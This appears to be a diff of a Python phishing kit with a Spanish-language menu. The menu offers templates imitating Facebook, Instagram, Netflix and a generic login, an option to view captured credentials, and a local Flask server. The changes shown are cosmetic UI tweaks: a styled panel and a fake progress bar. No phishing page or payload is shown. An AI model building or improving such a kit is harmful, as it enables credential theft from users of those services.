@@ -4,16 +4,18 @@ from modulos.inicio import banner, banner2, banner3
 import os
 from rich.console import Console
 from rich.markdown import Markdown
-from rich.markdown import Table
+from rich.progress import Progress
+import time
+from rich.panel import Panel
+
 
 MARKDOWN = """
 # Menú de opciones
-
 1. FACEBOOK
 2. INSTAGRAM
 3. GENERICA
 4. NETFLIX
-5. Ver Credenciales capturadas
+5. Ver *Credenciales capturadas*
 6. Salir
 """
 
@@ -96,12 +98,13 @@ def seleccionar_opcion():
 
     console = Console()
     md = Markdown(MARKDOWN)
-    console.print(md)
+    menu_panel = Panel(md, style="bold green",title="version 1.0.0", border_style="blue")
+    console.print(menu_panel)
 
 
     while True:
         try:
-            option = int(input("\nSeleccione una opción: "))
+            option = int(input("Seleccione una opción: "))
             if option in [1, 2, 3, 4]:
                 selected_option = option
                 break
@@ -124,5 +127,10 @@ if __name__ == '__main__':
         os.system('clear' if os.name == 'posix' else 'cls')
         banner()
         print("Iniciando el servidor Flask...")
+        with Progress() as progress:
+            task = progress.add_task("[green]Procesando...", total=5)
+            while not progress.finished:
+                progress.update(task, advance=0.2)
+                time.sleep(0.1)
         print("Accede al servidor en http://127.0.0.1:5000")
         app.run(host='127.0.0.1', port=5000, debug=False) 
